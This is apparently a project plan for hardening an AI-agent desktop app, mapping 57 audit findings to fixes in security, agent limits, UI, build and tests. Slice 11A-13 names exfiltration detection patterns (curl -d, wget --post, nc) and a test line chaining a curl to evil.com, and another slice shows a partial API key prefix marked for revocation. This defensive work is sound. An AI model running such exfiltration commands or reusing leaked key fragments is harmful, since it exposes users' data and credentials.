# Wave 11: Production Hardening — All 57 Audit Findings

**Date**: 2026-03-20
**Source**: `docs/production-readiness/` (10 reports, 57 issues)
**Baseline**: 3,895 tests, 277 files, branch `phase8-wave-8f-ui-ux`
**Target**: Fix ALL findings (CRITICAL through LOW), raise confidence from 6.9 to 9.0+/10

---

## Architecture: 6 Sub-Waves, Max Parallelism

Waves are ordered by dependency, not severity. Within each wave, slices are independent and can be dispatched as parallel agents.

```
Wave 11A: Security Lockdown (13 slices)     — FIRST, blocks everything
Wave 11B: Agent Hardening (10 slices)        — parallel with 11C
Wave 11C: Frontend Architecture (8 slices)   — parallel with 11B
Wave 11D: UX Deep Polish (14 slices)         — after 11C (touches same files)
Wave 11E: Build and Deploy (10 slices)       — parallel with 11D
Wave 11F: Test Coverage (8 slices)           — LAST (validates everything)
```

**Total: 63 slices** covering all 57 PRQ issues + 6 additional findings from detailed reports.

---

## Wave 11A: Security Lockdown (13 slices)

*Blocks ship. Fix first. Most are surgical config changes.*

### 11A-1: CORS Allowlist (PRQ-001, PRQ-002, CQ-003, CQ-004, CQ-025)
- **Files**: `packages/server/src/local/index.ts`, `routes/chat.ts`, `routes/anthropic-proxy.ts`, `routes/notifications.ts`
- **Action**:
  - Change `{ origin: true }` to `{ origin: ['http://localhost:1420', 'http://127.0.0.1:1420', 'tauri://localhost'] }`
  - Fix all SSE hijacked endpoints to validate origin against same allowlist before echoing
  - Remove `Access-Control-Allow-Origin: *` from notifications endpoint
  - Remove `Access-Control-Allow-Credentials: true` unless actually needed
- **Tests**: Add CORS rejection test for unknown origin
- **Est**: 1.5 hr

### 11A-2: CSP Hardening (PRQ-005, SEC-002)
- **Files**: `packages/server/src/local/security-middleware.ts`
- **Action**: Remove `'unsafe-eval'` and `'unsafe-inline'` from `script-src`. Keep `'self'` only. If React needs inline styles, add `'unsafe-inline'` to `style-src` only (already present in Tauri CSP).
- **Tests**: Verify CSP header in response
- **Est**: 30 min

### 11A-3: Vault Refresh Token Encryption (PRQ-004, SEC-001)
- **Files**: `packages/core/src/vault.ts`
- **Action**: In `setConnectorCredential()`, encrypt refresh token as separate vault entry `connector:{id}:refresh_token` or encrypt entire metadata blob. Add `getConnectorCredential()` to decrypt both access + refresh tokens.
- **Tests**: Add test verifying refresh token not in plaintext in vault.json
- **Est**: 1 hr

### 11A-4: API Key Revocation + Branch Cleanup (PRQ-006, SEC-001)
- **Files**: Git operations only
- **Action**:
  1. User must verify API key `sk-ant-api03-cbm94v...` is revoked at Anthropic dashboard
  2. Delete local branches: `git branch -D phase6-capability-truth` and all `worktree-agent-*` branches
  3. Update `.env` with rotated key if needed
- **Tests**: None (manual verification)
- **Est**: 15 min (requires user action)

### 11A-5: Approval Gate Auto-Deny (PRQ-014, CQ-013, SEC-006)
- **Files**: `packages/server/src/local/routes/chat.ts`
- **Action**: Change `resolve(true)` to `resolve(false)` on approval timeout (line ~689). Add log message: "Approval timed out - auto-denied for safety"
- **Tests**: Add test verifying timeout resolves to false
- **Est**: 15 min

### 11A-6: WebSocket Authentication - Local (PRQ-011, CQ-005)
- **Files**: `packages/server/src/local/index.ts` (ws handler)
- **Action**: Generate a session token on server startup, pass to frontend via `/api/health` response. Require token in WebSocket `Sec-WebSocket-Protocol` or query param. Reject connections without valid token.
- **Tests**: Add test for WS connection rejection without token
- **Est**: 2 hr

### 11A-7: WebSocket Authentication - Team (PRQ-012, CQ-019)
- **Files**: `packages/server/src/ws/gateway.ts`
- **Action**: Replace `userId = event.token` with Clerk JWT verification. Extract userId from validated JWT claims. Reject connections with invalid/expired tokens.
- **Tests**: Add test for team WS rejection with fake userId
- **Est**: 2 hr

### 11A-8: EventBus Listener Cleanup (PRQ-013, CQ-006)
- **Files**: `packages/server/src/local/index.ts` (ws close handler)
- **Action**: Store per-connection listener references in a Map. On disconnect, remove only that connection's listeners via `eventBus.removeListener(evt, handler)` instead of `removeAllListeners(evt)`.
- **Tests**: Add test: two WS clients connected, one disconnects, verify other still receives events
- **Est**: 1 hr

### 11A-9: Replace xlsx with exceljs (PRQ-020)
- **Files**: `packages/server/package.json`, `packages/server/src/local/routes/ingest.ts`
- **Action**: `npm uninstall xlsx && npm install exceljs`. Update ingest route to use exceljs API for spreadsheet parsing. Verify all xlsx usage replaced.
- **Tests**: Existing ingest tests should continue passing
- **Est**: 2 hr

### 11A-10: Tauri Updater Keypair (PRQ-019, SEC-007)
- **Files**: `app/src-tauri/tauri.conf.json`, GitHub Secrets
- **Action**: Run `npx tauri signer generate -w ~/.tauri/waggle.key`. Set pubkey in tauri.conf.json. Add private key to GitHub Secrets for release workflow.
- **Tests**: Verify tauri.conf.json pubkey is non-empty
- **Est**: 30 min

### 11A-11: Marketplace Security Scanner Fix (SEC-010)
- **Files**: `packages/marketplace/src/security.ts`
- **Action**: Replace `execSync('skill-scanner ' + args.join(' '))` with `execFileSync('skill-scanner', args)`. Replace `execSync('rm -f ' + tempFile)` with `fs.unlinkSync(tempFile)`.
- **Tests**: Existing scanner tests
- **Est**: 30 min

### 11A-12: Wire Injection Scanner + Tighten DOMPurify (SEC-008, SEC-009, SEC-013)
- **Files**: `packages/server/src/local/routes/chat.ts`, `packages/ui/src/components/chat/ChatMessage.tsx`, `packages/ui/src/components/files/CodePreview.tsx`
- **Action**:
  - Call `scanForInjection(message, 'user_input')` in chat route before agent loop
  - Add restrictive DOMPurify config (explicit ALLOWED_TAGS/ALLOWED_ATTR)
  - Add DOMPurify.sanitize() to CodePreview before dangerouslySetInnerHTML
- **Tests**: Add injection detection test
- **Est**: 1 hr

### 11A-13: Confirmation Gate Chain Detection (SEC-012)
- **Files**: `packages/agent/src/confirmation.ts`
- **Action**: If command contains `&&`, `||`, `;`, or `|`, always require confirmation regardless of safe pattern match. Add exfiltration patterns (`curl -d`, `wget --post`, `nc`, `ncat`).
- **Tests**: Add test: `echo hello && curl evil.com` requires confirmation
- **Est**: 30 min

---

## Wave 11B: Agent Hardening (10 slices)

*Agent loop safety, memory management, resource cleanup. Parallel with 11C.*

### 11B-1: Rate-Limit Retry Cap (PRQ-009, CQ-001, CQ-002)
- **Files**: `packages/agent/src/agent-loop.ts`
- **Action**: Replace `turn--` on 429/502/503/504 with a separate `retryCount` counter. Max 3 retries per error type, then throw graceful error. Never decrement turn counter.
- **Tests**: Add test: 4 consecutive 429s then agent terminates with error message
- **Est**: 1 hr

### 11B-2: Token Budget Enforcement (PRQ-026, CQ-004)
- **Files**: `packages/agent/src/agent-loop.ts`, `packages/shared/src/types.ts`
- **Action**: Add `maxTokenBudget?: number` to AgentLoopConfig. After each turn, check `totalInputTokens + totalOutputTokens > maxTokenBudget`. Default: 500K tokens (~$15 with Opus). Terminate gracefully with "Token budget exceeded" message.
- **Tests**: Add test: budget of 1000 tokens then loop terminates after exceeding
- **Est**: 1.5 hr

### 11B-3: Conversation History Window (PRQ-027, CQ-005)
- **Files**: `packages/server/src/local/routes/chat.ts`
- **Action**: Implement sliding window: keep last 50 messages in full context. For older messages, summarize into a compact context block. Add `maxHistoryMessages` config option.
- **Tests**: Add test: 100 messages then only last 50 sent to LLM
- **Est**: 2 hr

### 11B-4: SQL Parameterization in Vec Search (PRQ-010, CQ-006)
- **Files**: `packages/core/src/mind/search.ts`
- **Action**: Validate `frameId` is finite integer before interpolation: `if (!Number.isFinite(id)) throw new Error('Invalid frame ID')`. Apply to both `indexFrame` and `indexFramesBatch`.
- **Tests**: Add test: NaN frameId throws error
- **Est**: 30 min

### 11B-5: LIKE Wildcard Escaping (PRQ-033, CQ-017)
- **Files**: `packages/agent/src/tools.ts`
- **Action**: Escape `%` and `_` in LIKE patterns with proper escape clause.
- **Tests**: Add test: search for "100%" returns exact match
- **Est**: 30 min

### 11B-6: Sub-Agent + Background Task Cleanup (PRQ-032, CQ-010, CQ-011)
- **Files**: `packages/agent/src/subagent-tools.ts`, `packages/agent/src/system-tools.ts`
- **Action**: Add cleanup sweep: every 30 minutes, remove completed entries older than 30 min from `agentResults` and `backgroundTasks` maps. Add `MAX_ENTRIES = 100` cap with oldest-eviction.
- **Tests**: Add test: 101 entries then oldest evicted
- **Est**: 1 hr

### 11B-7: LoopGuard Window Detection (CQ-003)
- **Files**: `packages/agent/src/loop-guard.ts`
- **Action**: Track rolling window of last 10 call hashes. Flag if any hash appears 4+ times in the window (catches A/B oscillation).
- **Tests**: Add test: alternating A/B/A/B pattern detected after 8 calls
- **Est**: 45 min

### 11B-8: Vault Race Condition Fix (CQ-008)
- **Files**: `packages/core/src/vault.ts`
- **Action**: Add mutex around `set()`/`delete()` operations using a simple async lock. Write to temp file then atomic rename.
- **Tests**: Add test: concurrent set() calls do not lose data
- **Est**: 1 hr

### 11B-9: Cron Error Handling (CQ-016)
- **Files**: `packages/server/src/local/cron.ts`
- **Action**: Add error logging in catch block. Add `failCount` field to schedule record. Disable jobs after 5 consecutive failures. Add `last_error` field.
- **Tests**: Add test: failing job disabled after 5 attempts
- **Est**: 1 hr

### 11B-10: Graceful Agent Shutdown (CQ-020)
- **Files**: `packages/server/src/local/routes/chat.ts`, `packages/agent/src/agent-loop.ts`
- **Action**: Pass AbortSignal to agent loop. On `request.raw.on('close')`, abort the signal. Agent loop checks signal between turns.
- **Tests**: Add test: client disconnect then agent loop terminates
- **Est**: 1.5 hr

---

## Wave 11C: Frontend Architecture (8 slices)

*Error boundaries, code splitting, App.tsx decomposition. Parallel with 11B.*

### 11C-1: Error Boundaries (PRQ-003)
- **Files**: `app/src/App.tsx`, new `app/src/components/ErrorBoundary.tsx`
- **Action**: Create `ViewErrorBoundary` component (class component with `componentDidCatch`). Shows "Something went wrong" with view name + Retry button. Wrap each view in App.tsx with `<ViewErrorBoundary view="Chat">`. Add root-level boundary.
- **Tests**: Add test: rendering error in mock view then fallback shown
- **Est**: 1.5 hr

### 11C-2: Code Splitting (PRQ-015)
- **Files**: `app/src/App.tsx`, `app/vite.config.ts`
- **Action**: Wrap non-default views with `React.lazy()` + `Suspense`: CapabilitiesView, CockpitView, MissionControlView, SettingsView, EventsView, MemoryView. Add `manualChunks` to vite.config.ts to split vendor (react, marked, dompurify) from app.
- **Tests**: Verify build produces multiple chunks
- **Est**: 1.5 hr

### 11C-3: App.tsx State Extraction Phase 1 (PRQ-016)
- **Files**: `app/src/App.tsx`, new hooks in `app/src/hooks/`
- **Action**: Extract into custom hooks:
  - `useTeamState()` - team connection, team messages, team presence
  - `useAgentStatus()` - agent running, sub-agent status, token counts
  - `useOfflineStatus()` - offline detection, queued messages
  - `useFileHandling()` - file drops, upload state
- **Tests**: Existing tests should pass (behavior preserved)
- **Est**: 3 hr

### 11C-4: App.tsx State Extraction Phase 2 (PRQ-016 continued)
- **Files**: `app/src/App.tsx`, new hooks
- **Action**: Extract remaining concerns:
  - `useSlashCommands()` - command palette, command execution
  - `useKeyboardShortcuts()` - all keybinding registration
  - `useApprovalGates()` - approval state, approve/deny handlers
  - `useSessionManager()` - tab management, session switching
- **Tests**: Existing tests should pass
- **Est**: 3 hr

### 11C-5: Duplicate SSE Fix (PRQ-017, CQ-002)
- **Files**: `packages/ui/src/hooks/useNotifications.ts`, `packages/ui/src/hooks/useSubAgentStatus.ts`, new `packages/ui/src/hooks/useSSEStream.ts`
- **Action**: Create shared `useSSEStream(url)` hook that manages a single EventSource. Both `useNotifications` and `useSubAgentStatus` subscribe to the shared connection via event filtering.
- **Tests**: Add test: one EventSource created even with both hooks mounted
- **Est**: 1 hr

### 11C-6: Team Adapter Type Safety (PRQ-018, CQ-006)
- **Files**: `app/src/App.tsx`, service type definitions
- **Action**: Add `TeamService` interface with `getTeamStatus()`, `connectTeam()`, `disconnectTeam()`, `listTeams()`. Replace all `(adapter as any)` casts with type guard: `if ('getTeamStatus' in adapter)`.
- **Tests**: TypeScript compilation should catch any misuse
- **Est**: 1 hr

### 11C-7: Dead Code Removal (PRQ-036, CQ-007)
- **Files**: Delete 7 orphaned files:
  - `app/src/components/chat/ChatView.tsx` (legacy)
  - `app/src/hooks/useChat.ts` (legacy, uses old ipc)
  - `app/src/hooks/useSidecar.ts` (legacy)
  - `app/src/components/layout/Sidebar.tsx` (legacy)
  - `app/src/components/layout/TitleBar.tsx` (legacy)
  - `app/src/components/onboarding/OnboardingWizard.tsx` (legacy)
  - `app/src/components/settings/SettingsPanel.tsx` (legacy, stores keys in plaintext)
- **Action**: Delete files, verify no imports break
- **Tests**: `npx vitest run` + `npx tsc --noEmit`
- **Est**: 30 min

### 11C-8: TypeScript Error Cleanup (PRQ-030, PRQ-035, PRQ-051)
- **Files**: ~25 files in `app/src/`
- **Action**: Fix 87 TS errors: remove 69 unused imports, fix 18 type mismatches. Eliminate 20 `any` usages across app/ui (replace with proper types or `unknown`). Remove 5 ESLint suppressions where possible.
- **Tests**: `npx tsc --noEmit` should produce 0 errors
- **Est**: 2 hr

---

## Wave 11D: UX Deep Polish (14 slices)

*Direction D compliance from 78% to 95%+. Light theme fix. Accessibility. After 11C.*

### 11D-1: Streaming Indicator Fix (PRQ-007, UX-001)
- **Files**: `packages/ui/src/components/chat/ChatArea.tsx`
- **Action**: Replace BEM CSS classes with Tailwind: three `<span>` with `w-2 h-2 rounded-full bg-primary animate-bounce` and staggered animation delays. Remove unused BEM class references.
- **Tests**: Visual verification
- **Est**: 20 min

### 11D-2: SplashScreen Direction D (PRQ-008, UX-002)
- **Files**: `packages/ui/src/components/onboarding/SplashScreen.tsx`
- **Action**: Replace `from-[#1a1a2e] via-[#16213e] to-[#0f3460]` with `bg-background` or Direction D gradient using CSS variables. Replace `text-[#f5a623]` and `bg-[#f5a623]` with `text-primary` and `bg-primary`.
- **Tests**: Visual verification
- **Est**: 20 min

### 11D-3: ServiceProvider Tailwind Conversion (PRQ-021, UX-003)
- **Files**: `app/src/providers/ServiceProvider.tsx`
- **Action**: Replace all inline `style={{}}` with Tailwind classes. Error screen: `bg-background text-destructive`. Loading screen: `bg-background text-foreground` with Tailwind spinner (`animate-spin border-2 border-primary`). Remove all hardcoded hex colors.
- **Tests**: Visual verification
- **Est**: 45 min

### 11D-4: StatusBar + Sidebar Brand Fix (PRQ-022, UX-004, UX-009)
- **Files**: `packages/ui/src/components/common/StatusBar.tsx`, `app/src/components/AppSidebar.tsx`
- **Action**:
  - StatusBar: Replace `bg-[#0a0a1a]` with `bg-card` or `bg-muted`
  - StatusBar: Replace `bg-[#d4a843] text-[#1a1a2e]` with `bg-primary text-primary-foreground`
  - Sidebar: Replace `text-[#E8920F]` with `text-primary`
- **Tests**: Visual verification in both themes
- **Est**: 20 min

### 11D-5: Settings Error Recovery (PRQ-023, UX-005)
- **Files**: `app/src/views/SettingsView.tsx`
- **Action**: Add timeout (10s). If config still null, show error state with Retry button: "Failed to load settings. Is the server running?" matching CockpitView error pattern. Increase loading text opacity from `/40` to visible.
- **Tests**: Add test for error state rendering
- **Est**: 30 min

### 11D-6: CapabilitiesView Token Migration (PRQ-024, UX-006)
- **Files**: `app/src/views/CapabilitiesView.tsx`
- **Action**: Replace all 16 hardcoded `#d4a843` references with `text-primary`, `bg-primary`, `border-l-primary`. Update `priorityColor()` and `installTypeColor()` to return Tailwind class names instead of hex values. Replace `#3fb950` with `text-green-500` or semantic token. Replace `#58a6ff` fallback.
- **Tests**: Existing capability tests
- **Est**: 45 min

### 11D-7: Light Theme Fix - Global Pass (PRQ-025, UX-007)
- **Files**: Multiple (StatusBar, EventsView, Cockpit cards, ChatMessage, FeedbackButtons)
- **Action**:
  - Replace `bg-white/[0.03]` with `bg-muted/10` or `bg-secondary/10` (cockpit stat boxes)
  - Replace `bg-white/[0.06]` with `bg-muted/15` (progress bars)
  - Replace `bg-black/30` with `bg-muted/50` (EventsView session picker)
  - Replace `text-[#3fb950]` with `text-green-500 dark:text-green-400` (ChatMessage tool dots, FeedbackButtons)
  - Replace `hover:text-[#f85149]` with `hover:text-destructive` (FeedbackButtons)
- **Tests**: Toggle light mode, check all 7 views
- **Est**: 1.5 hr

### 11D-8: FileDropZone + Chat Color Fixes (UX-008, UX-015, UX-023)
- **Files**: `packages/ui/src/components/chat/FileDropZone.tsx`, `ChatMessage.tsx`, `ToolCard.tsx`
- **Action**:
  - FileDropZone: Replace `bg-indigo-500/[0.12]` with `bg-primary/10`, `border-indigo-500/60` with `border-primary/60`, `text-indigo-500` with `text-primary`
  - ToolCard: Convert inline `style={justCompleted ? ...}` to Tailwind conditional classes
- **Tests**: Visual verification
- **Est**: 30 min

### 11D-9: Accessibility - Events + Cockpit + MissionControl (UX-010, UX-013, UX-014)
- **Files**: `app/src/views/EventsView.tsx`, `app/src/views/MissionControlView.tsx`, `app/src/components/cockpit/*.tsx`
- **Action**:
  - Events: Add `role="tablist"`, `role="tab"`, `aria-selected`, `aria-controls`, `role="tabpanel"`
  - MissionControl: Add confirmation dialog before Kill button. Add `aria-label` to Pause/Resume/Kill buttons.
  - Cockpit: Add `aria-label` to all interactive elements. Add `aria-pressed` to cron toggle buttons. Add `<label>` to connector form inputs.
- **Tests**: Accessibility assertions where possible
- **Est**: 1.5 hr

### 11D-10: Memory + Events Error States (UX-011, UX-012)
- **Files**: `packages/ui/src/components/memory/MemoryBrowser.tsx`, `app/src/views/EventsView.tsx`
- **Action**:
  - Memory: Add `error` state. On API failure, show "Failed to load memories" with Retry button instead of misleading "No memories yet".
  - Events: Replace silent `catch` blocks with error state tracking. Show inline error with retry.
- **Tests**: Add error state tests
- **Est**: 45 min

### 11D-11: Toast + Team + KG Color Tokens (UX-016, UX-017, UX-018, UX-019)
- **Files**: `packages/ui/src/components/ToastContainer.tsx`, `TeamPresence.tsx`, `TaskBoard.tsx`, `TeamMessages.tsx`, `KGViewer.tsx`, `ToolResultRenderer.tsx`
- **Action**:
  - Toast: Replace 5 hardcoded category colors with Tailwind classes on border
  - Team components: Replace inline `style={{ color/backgroundColor }}` with Tailwind status classes
  - KGViewer: Replace hardcoded SVG stroke/fill with `currentColor`
  - ToolResultRenderer: Map tool types to semantic Direction D colors
- **Tests**: Visual verification
- **Est**: 1.5 hr

### 11D-12: Remaining Inline Styles Cleanup (PRQ-052)
- **Files**: Various (target: reduce unjustified inline styles to 0)
- **Action**: Convert all remaining unjustified inline styles to Tailwind. Keep only truly dynamic values (computed widths/heights for charts, CSS custom property setters).
- **Tests**: Grep for `style={{` should return only justified uses
- **Est**: 1 hr

### 11D-13: Onboarding Polish (UX-020, UX-021)
- **Files**: `packages/ui/src/components/onboarding/steps/NameStep.tsx`, `ReadyStep.tsx`
- **Action**:
  - Remove redundant `font-[Inter,system-ui,sans-serif]` declarations (body handles this)
  - Replace hardcoded `http://127.0.0.1:3333` with `getServerBaseUrl()` utility
  - Ensure ReadyStep import flow colors use `text-primary` not hardcoded hex
- **Tests**: Onboarding flow tests
- **Est**: 30 min

### 11D-14: React.memo Optimization (PRQ-034)
- **Files**: Key leaf components across `packages/ui/src/components/`
- **Action**: Apply `React.memo()` to: `ToolCard`, `ChatMessage`, `SessionCard`, `AgentFleetCard`, `ToastItem`, `StatusBar`. Wrap with `useCallback` for any inline handlers passed to memoized components.
- **Tests**: Existing tests (no behavior change)
- **Est**: 1.5 hr

---

## Wave 11E: Build and Deploy (10 slices)

*Parallel with 11D. Build pipeline, Docker, CI, dependencies.*

### 11E-1: Docker Non-Root + Build Tools Cleanup (PRQ-029, PRQ-057)
- **Files**: `Dockerfile`
- **Action**: Add after build stage: `RUN addgroup -S waggle && adduser -S waggle -G waggle && chown -R waggle:waggle /app /data`. Add `USER waggle` before CMD. Add separate production stage that does not include python3/make/g++.
- **Tests**: `docker build` succeeds
- **Est**: 30 min

### 11E-2: CI Branch Fix + Expansion (PRQ-044, PRQ-047)
- **Files**: `.github/workflows/ci.yml`
- **Action**: Change `master` to `main`. Add steps: `npx tsc --noEmit` (lint), npm cache, PostgreSQL + Redis service containers for full test suite. Add `npm audit --audit-level=high` step.
- **Tests**: Push to trigger CI
- **Est**: 1 hr

### 11E-3: npx Waggle Publishable (PRQ-028)
- **Files**: `packages/launcher/package.json`, add build script
- **Action**: Add `tsup` or `esbuild` build step to compile `src/cli.ts` to `dist/cli.js`. Update `bin` to point to compiled JS. Add `files: ["dist"]`. Add `engines: { node: ">=18" }`. Replace `@waggle/server: "*"` with proper dependency resolution. Add `prepublishOnly: "npm run build"`.
- **Tests**: `npx waggle --help` works after build
- **Est**: 2 hr

### 11E-4: macOS Build Config (PRQ-045)
- **Files**: `app/src-tauri/tauri.conf.json`
- **Action**: Change `"targets": ["nsis"]` to `"targets": "all"` (or `["nsis", "dmg"]`). Add macOS-specific icon entry (requires .icns or .png, can use placeholder until design ready).
- **Tests**: Verify config change (macOS build needs macOS CI)
- **Est**: 30 min

### 11E-5: App Icons (PRQ-046)
- **Files**: `app/src-tauri/icons/`
- **Action**: Generate multi-resolution icon set from Waggle bee logo: 16x16, 32x32, 48x48, 256x256 .ico + .png. Generate .icns for macOS. Use `tauri icon` command with a 1024x1024 source PNG.
- **Tests**: Visual verification
- **Est**: 1 hr (requires source image)

### 11E-6: .gitignore Hardening (PRQ-053)
- **Files**: `.gitignore`
- **Action**: Add: `.vault-key`, `vault.json`, `*.pem`, `*.key`, `*.p12`, `*.log`, `.DS_Store`, `Thumbs.db`
- **Tests**: `git status` shows no newly tracked sensitive files
- **Est**: 10 min

### 11E-7: Dev Credential Fallback Removal (PRQ-037)
- **Files**: `packages/server/src/config.ts`, `packages/server/src/db/migrate.ts`, `packages/worker/src/index.ts`
- **Action**: Remove hardcoded `postgres://waggle:waggle_dev@...` fallbacks from production code. Throw explicit error if `DATABASE_URL` not set. Keep fallbacks in test files only.
- **Tests**: Existing tests (they set DATABASE_URL)
- **Est**: 30 min

### 11E-8: Dependency Updates (PRQ-038, PRQ-054)
- **Files**: `package.json` (root + packages)
- **Action**: Update `@clerk/fastify` 2.x to 3.x. Update `mcp-guardian` to latest. Run `npm audit fix` for moderate CVEs. Document any unfixable CVEs.
- **Tests**: Full test suite
- **Est**: 2 hr

### 11E-9: Vault Key Validation (CQ-021)
- **Files**: `packages/core/src/vault.ts`
- **Action**: After reading key file, validate: `if (key.length !== 32) throw new Error('Vault key file is corrupted')`. Surface the error immediately rather than silent decryption failures.
- **Tests**: Add test: truncated key file throws error
- **Est**: 20 min

### 11E-10: Vault Windows Key Protection (PRQ-031, CQ-007)
- **Files**: `packages/core/src/vault.ts`
- **Action**: On Windows, use `execFileSync('icacls', [keyPath, '/inheritance:r', '/grant:r', `${process.env.USERNAME}:F`])` to restrict key file access to current user only. Document limitation in README.
- **Tests**: Verify permissions set on Windows
- **Est**: 45 min

---

## Wave 11F: Test Coverage (8 slices)

*Validate everything. Run last. Fills the gaps identified in Phase 5 report.*

### 11F-1: React Component Rendering Tests (PRQ-039)
- **Files**: New test files in `packages/ui/tests/components/`
- **Action**: Add React Testing Library tests for 5 critical components: ChatArea (message rendering, empty state), ApprovalGate (approve/deny flow), WorkspaceHome (context display), MemoryBrowser (frame selection), InstallCenter (pack install).
- **Tests**: 15-20 new tests
- **Est**: 3 hr

### 11F-2: SSE Stream Interruption Tests (PRQ-040)
- **Files**: New test in `packages/server/tests/`
- **Action**: Test SSE connection drop + reconnection. Test partial event parsing. Test backpressure with slow client.
- **Tests**: 5-8 new tests
- **Est**: 2 hr

### 11F-3: Vault Edge Case Tests (PRQ-041)
- **Files**: `packages/core/tests/vault.test.ts`
- **Action**: Add tests: corrupted vault.json (invalid JSON), missing .vault-key file, wrong key length, concurrent writes (race condition after 11B-8 fix).
- **Tests**: 6-8 new tests
- **Est**: 1.5 hr

### 11F-4: Untested Server Routes (PRQ-043)
- **Files**: New test files in `packages/server/tests/`
- **Action**: Add tests for: fleet routes (CRUD, status), import routes (commit, preview), anthropic-proxy (format translation), notifications SSE (event delivery).
- **Tests**: 15-20 new tests
- **Est**: 3 hr

### 11F-5: Agent Error Path Tests
- **Files**: `packages/agent/tests/agent-loop.test.ts`
- **Action**: Add tests for: HTTP 429 with retry cap (after 11B-1), token budget exceeded (after 11B-2), malformed LLM response, network timeout, concurrent requests.
- **Tests**: 8-10 new tests
- **Est**: 2 hr

### 11F-6: Sub-Agent + WebSocket Cleanup Tests (PRQ-055, PRQ-056)
- **Files**: `packages/agent/tests/subagent-tools.test.ts`, `packages/server/tests/ws/`
- **Action**: Verify sub-agent resource cleanup on failure (after 11B-6). Verify WebSocket reconnection restores state (after 11A-8).
- **Tests**: 6-8 new tests
- **Est**: 2 hr

### 11F-7: Worker Handler Tests
- **Files**: New `packages/worker/tests/`
- **Action**: Add tests for `group-handler.ts` and `task-handler.ts`. Test job execution, failure handling, retry behavior.
- **Tests**: 8-10 new tests
- **Est**: 2 hr

### 11F-8: KVARK Wiring + PM Frontend Integration (PRQ-048, PRQ-049)
- **Files**: `packages/server/src/local/index.ts` (KVARK), various view files (PM features)
- **Action**:
  - Wire KvarkClient into running server (conditional on KVARK_URL env var)
  - Add export button to Settings UI for GDPR export
  - Add backup/restore section to Settings
  - Add offline indicator to StatusBar (already partially done)
- **Tests**: Existing KVARK tests + new integration smoke tests
- **Est**: 4 hr

---

## Execution Strategy

### Parallelism Map
```
Session 1: Wave 11A (all 13 slices - security is sequential due to file overlap)
Session 2: Wave 11B (10 slices) || Wave 11C (8 slices) - parallel agents
Session 3: Wave 11D (14 slices) || Wave 11E (10 slices) - parallel agents
Session 4: Wave 11F (8 slices) - test coverage last
```

### Gate Checks
- After 11A: Run full test suite. Verify CORS, CSP, approval timeout manually.
- After 11B+11C: Run full test suite. Verify `npx tsc --noEmit` clean. Verify error boundary with intentional throw.
- After 11D+11E: Run full test suite. Toggle light/dark mode on all views. Verify Docker build.
- After 11F: Final test count should be 4,100+ (currently 3,895 + ~200 new tests).

### Success Criteria
- 0 CRITICAL issues remaining
- 0 HIGH issues remaining
- 0 MEDIUM issues remaining
- 0 LOW issues remaining
- Direction D compliance at or above 95%
- Light theme works across all 7 views
- Error boundaries catch view-level crashes
- All `npx tsc --noEmit` clean (0 errors)
- Test count at or above 4,100
- Docker runs as non-root
- Tauri updater has valid pubkey
- CORS restricted to known origins

### PRQ Coverage Matrix

Every PRQ-XXX issue is mapped to a slice:

| PRQ | Slice | PRQ | Slice | PRQ | Slice |
|-----|-------|-----|-------|-----|-------|
| 001 | 11A-1 | 020 | 11A-9 | 039 | 11F-1 |
| 002 | 11A-1 | 021 | 11D-3 | 040 | 11F-2 |
| 003 | 11C-1 | 022 | 11D-4 | 041 | 11F-3 |
| 004 | 11A-3 | 023 | 11D-5 | 042 | 11F-8 |
| 005 | 11A-2 | 024 | 11D-6 | 043 | 11F-4 |
| 006 | 11A-4 | 025 | 11D-7 | 044 | 11E-2 |
| 007 | 11D-1 | 026 | 11B-2 | 045 | 11E-4 |
| 008 | 11D-2 | 027 | 11B-3 | 046 | 11E-5 |
| 009 | 11B-1 | 028 | 11E-3 | 047 | 11E-2 |
| 010 | 11B-4 | 029 | 11E-1 | 048 | 11F-8 |
| 011 | 11A-6 | 030 | 11C-8 | 049 | 11F-8 |
| 012 | 11A-7 | 031 | 11E-10| 050 | 11D-* |
| 013 | 11A-8 | 032 | 11B-6 | 051 | 11C-8 |
| 014 | 11A-5 | 033 | 11B-5 | 052 | 11D-12|
| 015 | 11C-2 | 034 | 11D-14| 053 | 11E-6 |
| 016 | 11C-3/4| 035 | 11C-8 | 054 | 11E-8 |
| 017 | 11C-5 | 036 | 11C-7 | 055 | 11F-6 |
| 018 | 11C-6 | 037 | 11E-7 | 056 | 11F-6 |
| 019 | 11A-10| 038 | 11E-8 | 057 | 11E-1 |
